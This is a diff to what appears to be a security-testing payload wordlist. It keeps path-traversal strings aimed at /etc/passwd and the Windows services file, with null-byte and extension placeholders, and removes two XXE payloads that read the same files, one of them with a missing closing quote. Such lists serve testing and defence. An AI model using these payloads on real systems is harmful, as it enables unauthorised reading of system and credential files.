@@ -57,8 +57,6 @@ file://C:\Windows\System32\drivers\etc\services
 c:\Windows\System32\drivers\etc\services\0.[EXTVALUE]
 ../../../../../../../../../../etc/passwd\0.[EXTVALUE]
 ../../../../../../../../../../windows/System32/drivers/etc/services\0.[EXTVALUE]
-<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo[<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
-<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo[<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://c:/Windows/System32/drivers/etc/services>]><foo>&xxe;</foo>
 [FILE_NAME]
 [FILE_NAME]\0
 [FILE_NAME]\0.[EXTVALUE]
